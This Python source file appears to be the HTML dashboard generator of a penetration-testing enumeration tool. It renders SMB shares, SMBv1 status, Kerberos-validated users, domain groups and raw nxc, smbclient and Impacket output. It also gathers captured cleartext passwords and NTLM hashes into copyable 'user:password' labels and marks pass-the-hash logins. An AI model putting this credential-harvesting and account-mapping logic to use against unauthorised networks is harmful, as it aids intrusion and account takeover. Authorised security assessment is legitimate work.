            options = "".join(f'<li style="margin-bottom:4px"><span class="sev-medium" style="font-weight:800">✓ {h(c["label"])}</span></li>' for c in creds)
            auth_html = f'<details class="inline-web-list"><summary>{len(creds)} credenciais</summary><ul class="evidence-list" style="margin-top:5px;padding-left:0;list-style-type:none;">{options}</ul></details>'
        shares_found = shares_status.get(smbv1_key, False) or any(
            found for (share_ip, _), found in shares_status.items() if share_ip == service.ip
        )
        if shares_found:
            host_share_ports = sorted(port for (share_ip, port), found in shares_status.items() if share_ip == service.ip and found)
            anchor_port = 445 if 445 in host_share_ports else (host_share_ports[0] if host_share_ports else service.port)
            shares_anchor = f"shares-{safe_filename(service.ip)}-{anchor_port}"
            shares_html = f'<a href="#{h(shares_anchor)}" class="sev-medium" style="font-weight:800">✓ Shares</a>'
        else:
            shares_html = '<span class="muted">-</span>'
        tr_class = "dc-host" if service.ip in dc_ips else ""
        rows.append(
            f'<tr class="{tr_class}" data-filter="{row_filter(service.ip, hostname, service.port, service.protocol, service.service, service.product, service.version, endpoint_links, "smbv1" if smbv1_enabled else "", " ".join(c["label"] for c in creds), "shares" if shares_found else "")}" '
            f'data-service="{h(service.service or service_group_name(service))}">'
            f'<td><span class="mono">{h(service.ip)}</span><br><span class="muted">{h(hostname)}</span></td>'
            f'<td class="mono nowrap">{h(service.port)}/{h(service.protocol)}</td>'
            f"<td>{h(service.service or service_group_name(service))}</td>"
            f"<td>{h(service_descriptor(service) or '-')}</td>"
            f"<td>{smbv1_html}</td>"
            f"<td>{auth_html}</td>"
            f"<td>{shares_html}</td>"
            f"<td>{endpoint_links_html}</td>"
            f"<td>{service_interaction_buttons(service, state)}</td>"
            "</tr>"
        )
    rows.append("</tbody></table></div>")
    return "\n".join(rows)


def kerberos_service_group_table(
    services: list[ServiceRecord],
    endpoints_by_host_port: dict[tuple[str, int], list[WebEndpoint]],
    state: ScanState,
) -> str:
    rows = [
        '<div class="table-wrap"><table><thead><tr><th>Host</th><th>Porta</th><th>Serviço</th><th>Produto</th><th>USERS</th><th>Interação</th></tr></thead><tbody>'
    ]
    for service in sorted_services_unique(services):
        host = state.hosts.get(service.ip, HostRecord(ip=service.ip))
        hostname = host.hostname or host.fqdn
        users = kerberos_valid_users_for_target(state, service.ip)
        if users:
            preview = pill_list(users[:8])
            extra = f'<span class="pill">+{h(len(users) - 8)}</span>' if len(users) > 8 else ""
            users_html = (
                f'<div>{preview}{extra}</div>'
                f'<div class="copy-actions">{copy_value_button(f"Copiar lista completa ({len(users)})", chr(10).join(users))}</div>'
            )
        else:
            users_html = '<span class="muted">Nenhum usuário validado</span>'
        rows.append(
            f'<tr data-filter="{row_filter(service.ip, hostname, service.port, service.service, users)}" data-service="KERBEROS">'
            f'<td><span class="mono">{h(service.ip)}</span><br><span class="muted">{h(hostname)}</span></td>'
            f'<td class="mono nowrap">{h(service.port)}/{h(service.protocol)}</td>'
            f'<td>{h(service.service or "kerberos")}</td>'
            f'<td>{h(service_descriptor(service) or "-")}</td>'
            f'<td>{users_html}</td>'
            f'<td>{service_interaction_buttons(service, state)}</td>'
            '</tr>'
        )
    rows.append('</tbody></table></div>')
    return "\n".join(rows)


def smb_structured_summary_html(services: list[ServiceRecord], state: ScanState) -> str:
    allowed_hosts = {service.ip for service in services}
    host_data: dict[str, dict[str, Any]] = {}
    for item in state.evidence:
        if item.category != "smb" or item.ip not in allowed_hosts or not item.data:
            continue
        data = item.data
        useful_keys = {"local_users", "domain_users", "unscoped_users", "local_groups", "domain_groups", "group_members", "shares"}
        if not any(key in data for key in useful_keys):
            continue
        target = host_data.setdefault(
            item.ip,
            {
                "local_users": [],
                "domain_users": [],
                "unscoped_users": [],
                "local_groups": [],
                "domain_groups": [],
                "group_members": {},
                "credentials": {},
            },
        )
        for key in ("local_users", "domain_users", "unscoped_users", "local_groups", "domain_groups"):
            values = data.get(key, [])
            if isinstance(values, list):
                target[key] = dedupe_text([*target[key], *(str(value) for value in values)])
        members = data.get("group_members", {})
        if isinstance(members, dict):
            for group_name, group_values in members.items():
                target["group_members"].setdefault(str(group_name), [])
                if isinstance(group_values, list):
                    target["group_members"][str(group_name)] = dedupe_text(
                        [*target["group_members"][str(group_name)], *(str(value) for value in group_values)]
                    )
        # Share names from enum4linux/Nmap are discovery hints only.  The
        # mapping evidence is the sole source for this view because it is
        # created after smbclient connected to that exact tree and ran ``ls``.
        if not item.title.startswith("Acesso SMB por usuário —"):
            continue
        shares = data.get("shares", [])
        if not isinstance(shares, list) or not shares:
            continue
        credential_label = str(data.get("credential_label") or "")
        if not credential_label and data.get("auth_result") == "accepted":
            username = str(data.get("username") or "")
            credential_label = username or "anonymous"
        if not credential_label:
            continue
        endpoint_label = f"{credential_label} @ SMB/{item.port}" if item.port is not None else credential_label
        credential_shares = target["credentials"].setdefault(endpoint_label, {})
        for share in shares:
            if isinstance(share, str):
                share = {"name": share, "permissions": ["VISIBLE"]}
            if not isinstance(share, dict):
                continue
            if smb_permission_denies_tree_connect(share):
                # A denied enum4linux row is useful raw evidence, but it is not
                # an accessible share and must never appear in the mapping view.
                continue
            if not share.get("listing_success"):
                continue
            name = str(share.get("name", "")).strip()
            if name:
                credential_shares[name.lower()] = share

    if not host_data:
        return ""
    sections = ['<section class="panel" style="margin-top:14px"><h3>Mapa útil de usuários, grupos e compartilhamentos</h3>']
    for ip in sorted(host_data, key=ip_sort_key):
        data = host_data[ip]
        host_services = [service for service in services if service.ip == ip]
        validated_ports = sorted(
            {
                item.port
                for item in state.evidence
                if item.category == "smb"
                and item.ip == ip
                and item.port is not None
                and item.title.startswith("Acesso SMB por usuário —")
                and any(
                    isinstance(share, dict) and share.get("listing_success")
                    for share in (item.data.get("shares", []) if item.data else [])
                )
            }
        )
        port = 445 if 445 in validated_ports else (validated_ports[0] if validated_ports else next((service.port for service in host_services if service.port == 445), host_services[0].port if host_services else 445))
        sections.append(f'<div id="shares-{safe_filename(ip)}-{port}" class="enum-body" style="margin-top:12px">')
        sections.append(f'<h3><span class="mono">{h(ip)}</span></h3>')
        identity_rows: list[str] = []
        for label, key in (
            ("Usuários locais", "local_users"),
            ("Usuários do AD/domínio", "domain_users"),
            ("Usuários enumerados (escopo não confirmado)", "unscoped_users"),
            ("Grupos locais", "local_groups"),
            ("Grupos do AD/domínio", "domain_groups"),
        ):
            values = data[key]
            if values:
                identity_rows.append(
                    f'<div class="kv"><span>{h(label)}</span><div>{pill_list(values)}{copy_value_button("Copiar lista", chr(10).join(values))}</div></div>'
                )
        if identity_rows:
            sections.append(f'<div class="kv-grid">{"".join(identity_rows)}</div>')
        if data["group_members"]:
            member_rows = []
            for group_name, members in sorted(data["group_members"].items()):
                member_rows.append(f'<li><strong>{h(group_name)}</strong>: {h(", ".join(members) or "-")}</li>')
            sections.append(f'<details class="raw-details"><summary>Membros dos grupos</summary><div class="raw-body"><ul class="evidence-list">{"".join(member_rows)}</ul></div></details>')
        for credential_label, share_map in sorted(data["credentials"].items()):
            sections.append(f'<div class="enum-target-row" style="display:block"><strong>Usuário {h(credential_label)} é válido no servidor {h(ip)} nos seguintes compartilhamentos:</strong>')
            sections.append('<ul class="evidence-list">')
            for share in sorted(share_map.values(), key=lambda value: str(value.get("name", "")).lower()):
                permissions = share.get("permissions", ["UNKNOWN"])
                if not isinstance(permissions, list):
                    permissions = [str(permissions)]
                path = str(share.get("path", ""))
                path_html = f' <span class="muted mono">{h(path)}</span>' if path else ""
                if share.get("mounted"):
                    access_status = '<span class="pill sev-low">montado</span>'
                else:
                    access_status = '<span class="pill">acesso validado via smbclient</span>'
                interaction = str(share.get("interaction_command") or "").strip()
                interaction_html = copy_value_button("Abrir com smbclient", interaction) if interaction else ""
                sections.append(
                    f'<li><strong>{h(share.get("name", "-"))}</strong>: '
                    f'{pill_list(permissions)} {access_status}{path_html}{interaction_html}</li>'
                )
            sections.append('</ul></div>')
        sections.append('</div>')
    sections.append('</section>')
    return "".join(sections)


def detect_smbv1_status_from_evidence(state: ScanState) -> dict[tuple[str, int], bool]:
    """Check all SMB evidence to determine SMBv1 status per IP:port."""
    result: dict[tuple[str, int], bool] = {}
    for item in state.evidence:
        if item.category != "smb" or item.port is None:
            continue
        key = (item.ip, item.port)
        # Check evidence data for smbv1_enabled flag
        if item.data.get("smbv1_enabled") is True:
            result[key] = True
            continue
        # Check description text
        if "smbv1" in item.description.lower() and ("enabled" in item.description.lower() or "true" in item.description.lower()):
            result[key] = True
            continue
        # Check raw output file for SMBv1 patterns
        if item.raw_output_file and key not in result:
            raw_text = raw_file_text(item.raw_output_file, state)
            if raw_text and detect_smbv1_enabled(raw_text):
                result[key] = True
            elif key not in result:
                result[key] = False
    return result


def detect_auth_credentials_from_evidence(state: ScanState) -> dict[tuple[str, int], list[dict[str, str]]]:
    """Return a list of auth credentials per IP:port from evidence data."""
    result: dict[tuple[str, int], list[dict[str, str]]] = {}
    for item in state.evidence:
        if item.port is None:
            continue
        key = (item.ip, item.port)
        result.setdefault(key, [])
        # Check for successful auth evidence
        if item.data.get("auth_result") == "accepted":
            username = item.data.get("username", "") or ""
            clear_password = item.data.get("password", "") or ""
            ntlm_hash = item.data.get("ntlm_hash", "") or ""
            password = clear_password or ntlm_hash
            stored_method = "hash" if ntlm_hash and not clear_password else str(item.data.get("auth_method", "") or "")
            method = normalize_auth_method(stored_method, username=username)
            domain = str(item.data.get("domain", "") or "")
            if not username or username.lower() in {"anonymous", "guest"}:
                username = ""
                method = "anonymous"
                label = "anonymous"
            else:
                principal = f"{domain}\\{username}" if domain else username
                label = f"{principal}:{password}" if password else principal
            cred = {"username": username, "password": password, "method": method, "domain": domain, "label": label}
            if cred not in result[key]:
                result[key].append(cred)
            continue
        # Check for anonymous/null session in parsed SMB data
        anonymous_visible = item.title.lower() == "smb shares visible anonymously"
        if item.category == "smb" and (item.data.get("anonymous_or_null_session") or anonymous_visible):
            cred = {"username": "", "password": "", "method": "anonymous", "domain": "", "label": "anonymous/null"}
            if cred not in result[key]:
                result[key].append(cred)
    return result


def normalize_auth_method(method: str, *, username: str = "") -> str:
    value = (method or "").strip().lower()
    if not username or username.lower() in {"anonymous", "guest"} or value in {"anonymous", "guest", "null"}:
        return "anonymous"
    if value in {"hash", "ntlm-hash", "ntlm_hash", "pth", "pass-the-hash"}:
        return "hash"
    return "password"


def credential_key(credential: dict[str, str]) -> tuple[str, str, str, str]:
    return (
        credential.get("domain", "").lower(),
        credential.get("username", "").lower(),
        credential.get("password", ""),
        credential.get("method", ""),
    )


def validated_credentials(
    state: ScanState,
    *,
    ip: str | None = None,
    include_anonymous: bool = False,
) -> list[dict[str, str]]:
    credentials_by_target = detect_auth_credentials_from_evidence(state)
    result: list[dict[str, str]] = []
    seen: set[tuple[str, str, str, str]] = set()
    for (target_ip, _), credentials in credentials_by_target.items():
        if ip is not None and target_ip != ip:
            continue
        for credential in credentials:
            if credential["method"] == "anonymous" and not include_anonymous:
                continue
            key = credential_key(credential)
            if key in seen:
                continue
            seen.add(key)
            result.append(credential)
    return result


def smb_share_names_from_evidence(state: ScanState, ip: str, port: int) -> set[str]:
    shares: set[str] = set()
    for item in state.evidence:
        if item.category != "smb" or item.ip != ip or item.port != port:
            continue
        for share in item.data.get("shares", []) if item.data else []:
            if isinstance(share, dict):
                name = str(share.get("name", "")).strip()
            else:
                name = str(share).strip()
            if name:
                shares.add(name.lower())
        excerpt = str(item.data.get("output_excerpt", "") if item.data else "")
        for name in parse_smbclient_share_listing(excerpt):
            shares.add(name.lower())
        if item.raw_output_file:
            raw_text = raw_file_text(item.raw_output_file, state)
            for name in parse_smbclient_share_listing(raw_text):
                shares.add(name.lower())
    return shares


def smb_endpoint_identity(state: ScanState, ip: str, port: int) -> tuple[str, str]:
    hostname = ""
    domain = ""
    for item in state.evidence:
        if item.category != "smb" or item.ip != ip or item.port != port:
            continue
        hostname = hostname or str(item.data.get("hostname", "") if item.data else "").strip().lower()
        domain = domain or str(item.data.get("domain", "") if item.data else "").strip().lower()
    return hostname, domain


def smb_services_are_equivalent(state: ScanState, first: ServiceRecord, second: ServiceRecord) -> bool:
    if first.ip != second.ip or {first.port, second.port} != SMB_PORTS:
        return False
    first_shares = smb_share_names_from_evidence(state, first.ip, first.port)
    second_shares = smb_share_names_from_evidence(state, second.ip, second.port)
    if first_shares and second_shares:
        return first_shares == second_shares
    first_identity = smb_endpoint_identity(state, first.ip, first.port)
    second_identity = smb_endpoint_identity(state, second.ip, second.port)
    if any(first_identity) and first_identity == second_identity:
        return True
    first_product = (first.product.strip().lower(), first.version.strip().lower(), first.banner.strip().lower())
    second_product = (second.product.strip().lower(), second.version.strip().lower(), second.banner.strip().lower())
    return any(first_product) and first_product == second_product


def preferred_smb_services(
    state: ScanState,
    services: Iterable[ServiceRecord] | None = None,
) -> list[ServiceRecord]:
    candidates = sorted_services_unique(services if services is not None else services_for_group(state, "SMB", {"tcp"}))
    by_host: dict[str, list[ServiceRecord]] = {}
    for service in candidates:
        by_host.setdefault(service.ip, []).append(service)
    selected: list[ServiceRecord] = []
    for host_services in by_host.values():
        port_139 = next((service for service in host_services if service.port == 139), None)
        port_445 = next((service for service in host_services if service.port == 445), None)
        if port_139 and port_445 and smb_services_are_equivalent(state, port_139, port_445):
            selected.extend(service for service in host_services if service.port != 139)
        else:
            selected.extend(host_services)
    return sorted_services_unique(selected)


def detect_smb_shares_from_evidence(state: ScanState) -> dict[tuple[str, int], bool]:
    """Return True only when at least one share passed the access probe."""
    result: dict[tuple[str, int], bool] = {}
    for item in state.evidence:
        if item.category != "smb" or item.port is None:
            continue
        key = (item.ip, item.port)
        if key in result:
            continue
        if not item.title.startswith("Acesso SMB por usuário —"):
            continue
        shares = item.data.get("shares", [])
        if isinstance(shares, list) and any(
            isinstance(share, dict) and share.get("listing_success") for share in shares
        ):
            result[key] = True
    return result


def web_dropdown_for_service(endpoints: list[WebEndpoint], state: ScanState) -> str:
    valid_endpoints = [endpoint for endpoint in endpoints if is_reportable_web_endpoint(endpoint)]
    if not valid_endpoints:
        return '<span class="muted">-</span>'
    custom_wordlist = dashboard_custom_wordlist(state)
    rows = [
        '<details class="inline-web-list">',
        f"<summary>{h(len(valid_endpoints))} URL(s)</summary>",
        '<div class="inline-web-body">',
    ]
    for endpoint in valid_endpoints:
        rows.append(f'<div class="inline-web-item">{web_endpoint_line(endpoint, state, custom_wordlist=custom_wordlist)}</div>')
    rows.append("</div></details>")
    return "\n".join(rows)


def web_links_block(endpoints: list[WebEndpoint], state: ScanState) -> str:
    valid_endpoints = [endpoint for endpoint in endpoints if is_reportable_web_endpoint(endpoint)]
    if not valid_endpoints:
        return ""
    custom_wordlist = dashboard_custom_wordlist(state)
    rows = ['<h3>Web</h3><div class="web-list">']
    for endpoint in valid_endpoints:
        rows.append(web_endpoint_line(endpoint, state, custom_wordlist=custom_wordlist))
    rows.append("</div>")
    return "\n".join(rows)


def dashboard_custom_wordlist(state: ScanState) -> str:
    value = str(state.metadata.get("web_wordlist") or "").strip()
    return value


def evidence_compact_list(evidence: list[Evidence]) -> str:
    if not evidence:
        return empty_state("Nenhuma evidência priorizada neste agrupamento.")
    rows = ['<ul class="evidence-list">']
    for item in evidence:
        target = item.ip + (f":{item.port}" if item.port else "")
        rows.append(
            f'<li class="sev-{h(item.severity)}" data-filter="{row_filter(item.severity, item.category, target, item.service, item.title, item.description)}" '
            f'data-severity="{h(item.severity)}" data-category="{h(item.category)}" data-service="{h(item.service)}">'
            f'<strong class="sev-{h(item.severity)}">{h(item.severity.upper())}</strong> '
            f'<span class="mono">{h(target)}</span> {h(item.title)}'
            f'<div class="muted">{h(item.description)}</div>'
            "</li>"
        )
    rows.append("</ul>")
    return "\n".join(rows)


def attention_compact_list(evidence: list[Evidence], initial: int = 4) -> str:
    if not evidence:
        return empty_state("Nenhuma evidência priorizada neste agrupamento.")
    rows = ['<ul class="evidence-list attention-list">']
    limit = max(0, initial)
    for index, item in enumerate(evidence):
        target = item.ip + (f":{item.port}" if item.port else "")
        extra_class = " attention-extra hidden" if index >= limit else ""
        rows.append(
            f'<li class="sev-{h(item.severity)}{extra_class}" data-filter="{row_filter(item.severity, item.category, target, item.service, item.title, item.description)}" '
            f'data-severity="{h(item.severity)}" data-category="{h(item.category)}" data-service="{h(item.service)}">'
            f'<strong class="sev-{h(item.severity)}">{h(item.severity.upper())}</strong> '
            f'<span class="mono">{h(target)}</span> {h(item.title)}'
            f'<div class="muted">{h(item.description)}</div>'
            "</li>"
        )
    rows.append("</ul>")
    if len(evidence) > limit:
        rows.append(f'<button class="attention-toggle" type="button" data-attention-toggle>Mostrar mais ({h(len(evidence) - limit)})</button>')
    return "\n".join(rows)


def enumeration_details_block(evidence: list[Evidence], state: ScanState, title: str = "Informações de Enumeração") -> str:
    items = [
        item
        for item in evidence
        if item.raw_output_file or item.command or item.data or item.description
    ]
    if not items:
        return ""
    rows = [
        '<details class="enum-details">',
        f'<summary>{h(title)} <span class="metric"><strong>{h(len(items))}</strong>itens</span></summary>',
        '<div class="enum-list">',
    ]
    for item in sorted(items, key=lambda entry: (severity_rank(entry.severity), entry.category, entry.port or 0, entry.title)):
        target = item.ip + (f":{item.port}" if item.port else "")
        data_text = evidence_data_text(item)
        raw = raw_details_for_evidence(item, state)
        data_html = f'<div class="enum-data">{h(data_text)}</div>' if data_text else ""
        output_excerpt = item.data.get("output_excerpt", "") if item.data else ""
        excerpt_html = inline_output_excerpt_html(output_excerpt, item.command or "", target) if output_excerpt else ""
        command_copy = copy_value_button("Copiar comando", item.command) if item.command else ""
        rows.append(
            '<details class="enum-item">'
            "<summary>"
            f'<span><strong>{h(item.title)}</strong><br><span class="muted mono">{h(target)} · {h(item.category)} · {h(item.service)}</span></span>'
            f'<span class="metric"><strong>{h(item.severity)}</strong>nível</span>'
            "</summary>"
            '<div class="enum-body">'
            f'<div>{h(item.description)}</div>'
            f'{command_copy}'
            f'{excerpt_html}'
            f'<div class="web-meta"><span class="pill">{h(item.category)}</span></div>'
            f'{raw}'
            f'{data_html}'
            "</div>"
            "</details>"
        )
    rows.append("</div></details>")
    return "\n".join(rows)


def grouped_enumeration_details_block(evidence: list[Evidence], state: ScanState, title: str = "Informações de Enumeração") -> str:
    items = [
        item
        for item in evidence
        if item.raw_output_file or item.command or item.data or item.description
    ]
    if not items:
        return ""
    grouped: dict[str, list[Evidence]] = {}
    for item in items:
        grouped.setdefault(item.ip, []).append(item)
    rows = [
        '<details class="enum-details">',
        f'<summary>{h(title)} <span class="metric"><strong>{h(len(grouped))}</strong>hosts</span></summary>',
        '<div class="enum-list">',
    ]
    for host_ip, group_items in sorted(grouped.items(), key=lambda entry: ip_sort_key(entry[0])):
        sorted_items = sorted(group_items, key=lambda entry: (entry.port or 0, entry.category, entry.service, entry.title))
        ports = sorted({item.port for item in sorted_items if item.port})
        categories = sorted({item.category for item in sorted_items if item.category})
        useful_rows: list[str] = []
        raw_rows: list[str] = []
        seen_raw_files: set[str] = set()
        for item in sorted_items:
            useful_text = useful_evidence_summary(item)
            if useful_text:
                target = item.ip + (f":{item.port}" if item.port else "")
                useful_rows.append(
                    f'<div class="enum-target-row"><span class="mono">{h(target)}</span>'
                    f'<span class="pill sev-{h(item.severity)}">{h(item.title)}</span><span>{h(useful_text)}</span></div>'
                )
            if item.raw_output_file and item.raw_output_file not in seen_raw_files:
                seen_raw_files.add(item.raw_output_file)
                raw_text = raw_file_text(item.raw_output_file, state)
                if raw_text:
                    meta = item.ip + (f":{item.port}" if item.port else "") + f" · {item.title}"
                    raw_rows.append(raw_details_html(f"RAW — {item.title}", raw_text, command=item.command, meta=meta))
        descriptions = f'<div class="enum-target-list">{"".join(useful_rows)}</div>' if useful_rows else ""
        raw = "".join(raw_rows)
        rows.append(
            '<details class="enum-item">'
            "<summary>"
            f'<span><strong>{h(host_ip)}</strong><br><span class="muted mono">{h(", ".join(categories) or "-")} · portas {h(", ".join(str(port) for port in ports) or "-")}</span></span>'
            f'<span class="metric"><strong>{h(len(raw_rows))}</strong>RAW</span>'
            "</summary>"
            '<div class="enum-body">'
            f'{descriptions}'
            f'{raw}'
            "</div>"
            "</details>"
        )
    rows.append("</div></details>")
    return "\n".join(rows)


def useful_evidence_summary(item: Evidence) -> str:
    description = (item.description or "").strip()
    lower = description.lower()
    noisy_fragments = (
        "smbv1 is enabled",
        "status_access_denied",
        "error enumerating shares",
        "service is reachable",
        " is reachable",
        "service exposed",
    )
    if any(fragment in lower for fragment in noisy_fragments):
        description = ""
    data = item.data or {}
    useful_keys = {
        "auth_result",
        "valid_users",
        "local_users",
        "domain_users",
        "unscoped_users",
        "local_groups",
        "domain_groups",
        "group_members",
        "shares",
    }
    if description:
        return description
    if data.get("auth_result") == "accepted":
        username = str(data.get("username") or "anonymous")
        return f"Autenticação válida para {username}."
    present = [key for key in useful_keys if data.get(key)]
    if present:
        return "Dados úteis estruturados: " + ", ".join(sorted(present)) + "."
    return ""


def group_severity(items: list[Evidence]) -> str:
    if not items:
        return "info"
    return sorted({item.severity for item in items}, key=severity_rank)[0]


def grouped_evidence_descriptions(items: list[Evidence]) -> str:
    rows = ['<div class="enum-target-list">']
    for item in items:
        target = item.ip + (f":{item.port}" if item.port else "")
        desc = item.description or item.service or item.category
        if not desc:
            continue
        rows.append(
            f'<div class="enum-target-row"><span class="mono">{h(target)}</span>'
            f'<span class="pill sev-{h(item.severity)}">{h(item.severity)}</span>'
            f'<span>{h(desc)}</span></div>'
        )
    rows.append("</div>")
    return "\n".join(rows)


def evidence_matches_service_group(item: Evidence, group_name: str, services: list[ServiceRecord]) -> bool:
    if item.port is None:
        return False
    for service in services:
        if item.ip == service.ip and item.port == service.port and service_group_name(service) == group_name:
            return True
    return False


def is_group_enum_noise_evidence(item: Evidence) -> bool:
    if item.command or item.raw_output_file or item.data:
        return False
    if item.category == "exposure":
        return True
    title = item.title.lower()
    description = item.description.lower()
    exposure_title = any(token in title for token in [" exposed", " open", "service exposed", "port open"])
    exposure_description = any(token in description for token in ["reachable", "porta aberta", "porta exposta", "service is reachable", "is open"])
    return exposure_title and exposure_description


def raw_details_for_evidence(item: Evidence, state: ScanState) -> str:
    if not item.raw_output_file:
        return ""
    text = raw_file_text(item.raw_output_file, state)
    if not text:
        return ""
    target = item.ip + (f":{item.port}" if item.port else "")
    return raw_details_html("RAW", text, command=item.command, meta=target)


def grouped_raw_details(title: str, items: list[Evidence], state: ScanState) -> str:
    chunks: list[str] = []
    seen_raw_files: set[str] = set()
    for item in items:
        if not item.raw_output_file or item.raw_output_file in seen_raw_files:
            continue
        seen_raw_files.add(item.raw_output_file)
        text = raw_file_text(item.raw_output_file, state)
        if not text:
            continue
        target = item.ip + (f":{item.port}" if item.port else "")
        chunks.append(
            "\n".join(
                [
                    f"===== {target} | {item.title} | {item.category} =====",
                    text.rstrip(),
                    "",
                ]
            )
        )
    if not chunks:
        return ""
    command_text = evidence_group_command_text(title, items, state)
    return raw_details_html("RAW agregado", "\n".join(chunks).rstrip() + "\n", command=command_text, meta=title)


def evidence_group_command_text(title: str, items: list[Evidence], state: ScanState) -> str:
    services = [
        ServiceRecord(ip=item.ip, port=int(item.port), protocol="tcp", service=item.service or item.category)
        for item in items
        if item.port
    ]
    tool = evidence_title_tool_label(title)
    if tool and len(services) > 1:
        loop_command = service_tool_loop_command(tool, services, state)
        if loop_command:
            return loop_command
    commands = [item.command for item in items if item.command]
    return command_text_for_copy(commands, loop_multiple=True)


def evidence_title_tool_label(title: str) -> str:
    normalized = title.lower()
    if normalized.startswith("nmap "):
        return "Nmap NSE"
    mapping = {
        "nxc rdp": "NXC RDP",
        "nxc smb": "NXC",
        "nxc smb shares": "NXC",
        "nxc ldap": "NXC LDAP",
        "nxc ftp": "NXC FTP",
        "nxc mssql": "NXC MSSQL",
        "nxc winrm": "NXC WinRM",
        "nxc ssh": "NXC SSH",
        "nxc mysql": "NXC MySQL",
        "auth accepted": "Auth",
        "auth rejected": "Auth",
        "crackmapexec smb": "CrackMapExec",
        "smbclient anonymous list": "SMBClient",
        "rpcclient srvinfo": "RPCClient",
        "impacket-smbclient shares": "Impacket",
    }
    return mapping.get(normalized, "")


def raw_details_html(label: str, text: str, command: str = "", meta: str = "") -> str:
    raw_id = command_dom_id(f"raw:{meta}:{text[:200]}")
    copy_command = copy_value_button("Copiar comando", command) if command else ""
    return (
        '<details class="raw-details">'
        f'<summary>{h(label)}</summary>'
        '<div class="raw-body">'
        f'<div class="raw-toolbar">{copy_command}<span class="muted mono">{h(meta)}</span></div>'
        f'<textarea id="{h(raw_id)}" class="raw-output" readonly spellcheck="false">{h(text)}</textarea>'
        "</div>"
        "</details>"
    )


def inline_output_excerpt_html(output: str, command: str = "", meta: str = "") -> str:
    """Render a tool's stdout as an inline expandable details block."""
    if not output or not output.strip():
        return ""
    excerpt_id = command_dom_id(f"excerpt:{meta}:{output[:200]}")
    command_display = f'<div class="muted mono" style="margin-bottom:6px;font-size:11px;word-break:break-all">{h(command)}</div>' if command else ""
    return (
        '<details class="raw-details" style="margin-top:8px">'
        '<summary>Output do comando</summary>'
        '<div class="raw-body">'
        f'{command_display}'
        f'<textarea id="{h(excerpt_id)}" class="raw-output" readonly spellcheck="false" style="max-height:300px">{h(output)}</textarea>'
        "</div>"
        "</details>"
    )


def raw_file_text(raw_file: str, state: ScanState) -> str:
    candidate = Path(state.output_dir) / raw_file
    try:
        candidate.resolve().relative_to(Path(state.output_dir).resolve())
    except ValueError:
        return ""
    if not candidate.exists() or not candidate.is_file():
        return ""
    try:
        with candidate.open(encoding="utf-8", errors="replace") as handle:
            excerpt = handle.read(65537)
        if len(excerpt) > 65536:
            return excerpt[:65536] + "\n[Prévia limitada a 64 KiB; consulte o arquivo RAW completo.]"
        return excerpt
    except OSError:
        return ""


def evidence_data_text(item: Evidence, limit: int = 6000) -> str:
    if not item.data:
        return ""
    try:
        text = json.dumps(item.data, indent=2, ensure_ascii=False, default=str)
    except TypeError:
        text = str(item.data)
    if len(text) > limit:
        return text[:limit].rstrip() + "\n...[truncated]"
    return text


def group_services_by_host(services: list[ServiceRecord]) -> dict[str, list[ServiceRecord]]:
    grouped: dict[str, list[ServiceRecord]] = {}
    for service in services:
        grouped.setdefault(service.ip, []).append(service)
    return grouped


def group_web_by_host(endpoints: list[WebEndpoint]) -> dict[str, list[WebEndpoint]]:
    grouped: dict[str, list[WebEndpoint]] = {}
    for endpoint in endpoints:
        grouped.setdefault(endpoint.ip, []).append(endpoint)
    return grouped


def group_web_by_host_port(endpoints: list[WebEndpoint]) -> dict[tuple[str, int], list[WebEndpoint]]:
    grouped: dict[tuple[str, int], list[WebEndpoint]] = {}
    for endpoint in endpoints:
        grouped.setdefault((endpoint.ip, endpoint.port), []).append(endpoint)
    return grouped


def group_evidence_by_host(evidence: list[Evidence]) -> dict[str, list[Evidence]]:
    grouped: dict[str, list[Evidence]] = {}
    for item in evidence:
        grouped.setdefault(item.ip, []).append(item)
    return grouped


def group_services_by_type(services: list[ServiceRecord]) -> dict[str, list[ServiceRecord]]:
    grouped: dict[str, list[ServiceRecord]] = {}
    for service in services:
        grouped.setdefault(service_group_name(service), []).append(service)
    return grouped


def service_group_name(service: ServiceRecord) -> str:
    service_name = (service.service or "").lower()
    descriptor = f"{service_name} {service.product.lower()} {service.version.lower()} {service.banner.lower()}"
    port = service.port
    if port in SMB_PORTS or any(token in descriptor for token in ["microsoft-ds", "netbios", "smb", "samba"]):
        return "SMB"
    if port in RDP_PORTS or any(token in descriptor for token in ["rdp", "ms-wbt"]):
        return "RDP"
    if port in SSH_PORTS or "ssh" in descriptor:
        return "SSH"
    if port in FTP_PORTS or service_name == "ftp":
        return "FTP"
    if port in LDAP_PORTS or "ldap" in descriptor:
        return "LDAP/AD"
    if port in KERBEROS_PORTS or "kerberos" in descriptor:
        return "KERBEROS"
    if is_web_service(service):
        return "WEB"
    if port in MYSQL_PORTS | POSTGRES_PORTS | MSSQL_PORTS | REDIS_PORTS | MONGO_PORTS | ELASTIC_PORTS or any(
        token in descriptor for token in ["mysql", "postgres", "ms-sql", "mssql", "sql server", "redis", "mongo", "elastic"]
    ):
        return "DATABASE/DATA"
    if port in WINRM_PORTS or "wsman" in descriptor or "winrm" in descriptor:
        return "WINRM"
    if port in NFS_PORTS or "nfs" in descriptor or "rpcbind" in descriptor:
        return "NFS/RPC"
    if port in SNMP_PORTS or "snmp" in descriptor:
        return "SNMP"
    if port in VNC_PORTS or "vnc" in descriptor:
        return "VNC"
    if port in DOCKER_PORTS or port in K8S_PORTS or any(token in descriptor for token in ["docker", "kubernetes", "kubelet"]):
        return "CONTAINER"
    if port in TELNET_PORTS or "telnet" in descriptor:
        return "TELNET"
    if port in {25, 110, 143, 465, 587, 993, 995} or any(token in descriptor for token in ["smtp", "pop3", "imap"]):
        return "MAIL"
    if port == 53 or "domain" in descriptor or "dns" in descriptor:
        return "DNS"
    return "OTHER"


def is_web_service(service: ServiceRecord) -> bool:
    web_ports = {80, 443, 3000, 5000, 5601, 8000, 8008, 8080, 8081, 8082, 8443, 8888, 9000, 9200, 9443}
    service_name = (service.service or "").lower()
    descriptor = f"{service_name} {service.product.lower()} {service.version.lower()} {service.banner.lower()}"
    if service.port in web_ports:
        return True
    return any(token in descriptor for token in ["http", "https", "apache", "nginx", "iis", "tomcat", "jetty", "gunicorn", "uwsgi"])


def service_descriptor(service: ServiceRecord) -> str:
    return " ".join(part for part in [service.product, service.version, service.banner] if part).strip()


def metric_pill(label: str, value: Any) -> str:
    return f'<span class="metric"><strong>{h(value)}</strong>{h(label)}</span>'


def pill_list(values: Iterable[Any]) -> str:
    clean = []
    for value in values:
        text = str(value).strip()
        if text and text not in clean:
            clean.append(text)
    return " ".join(f'<span class="pill">{h(item)}</span>' for item in clean)


